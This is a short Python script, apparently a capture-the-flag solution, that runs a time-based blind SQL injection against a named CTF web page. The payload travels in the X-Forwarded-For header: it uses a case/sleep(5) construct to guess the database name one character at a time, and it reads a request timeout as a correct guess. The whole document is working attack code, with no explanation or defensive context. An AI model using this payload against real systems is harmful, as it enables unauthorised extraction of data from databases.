import requests


guess='abcdefghijklmnopqrstuvwxyz0123456789@_.{}-'
url = 'http://ctf5.shiyanbar.com/web/wonderkun/index.php'
database = ''
for i in range(1,5):
    for each in guess:
        headers = {"X-Forwarded-For":"1' and case when (substring((select database()) from %s for 1)='%s') then sleep(5) else sleep(0) end and '1'='1" %(i,each)}
        try:
            r = requests.get(url, headers = headers, timeout=5)
            print(r.text)
        except:  
            database = database + each
            
            break
        
print('database_name='+database)